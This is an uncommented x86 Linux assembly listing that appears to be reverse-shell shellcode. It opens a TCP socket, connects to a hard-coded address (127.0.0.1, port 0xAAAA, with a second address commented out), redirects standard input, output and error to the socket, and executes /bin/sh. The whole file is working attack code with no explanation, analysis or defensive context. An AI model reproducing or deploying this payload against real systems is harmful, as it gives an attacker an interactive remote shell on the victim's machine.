global _start
_start:

    ; socket()
    
    xor edx, edx 
    push edx        ; IPPROTO_IP
    push 0x1        ; SOCK_STREAM
    push 0x2        ; AF_INET
    mov ecx, esp    ; pointer to args

    mov bl, 0x1     ; SYS_SOCKET function
    mov al, 0x66    ; sys socket()
    int 80h

    mov esi, eax    ; save socket_desc

    ;connect()
    ; push dword 0x0337d30a        ; address
    push dword 0x0100007f
    push word 0xAAAA     ; port 
    push word 2        ; AF_INET
    mov ecx, esp

    push 0x10       ;
    push ecx        ; param
    push esi        ; socket_desc
    mov ecx, esp

    mov al, 0x66
    mov bl, 0x3
    int 80h

    mov ebx, esi    

    ; dup2(re,0)
    xor	ecx, ecx	; 0
    mov	al, 0x3f	; dup2
    int	0x80		

    ; dup2(re,1)
    inc	ecx     	; 1
    mov	al, 0x3f	; dup2
    int	0x80
        
    ; dup2(re,2)
    inc	ecx     	; 2
    mov	al, 0x3f	; dup2
    int	0x80


    ; execve()
    xor edx, edx
    xor ecx, ecx

    push edx                  ; 0x00000000
    push dword 0x68732f2f      ; hs/
    push dword 0x6e69622f     ; nib/
    mov ebx,esp

    mov al, 0x0b
    int 80h
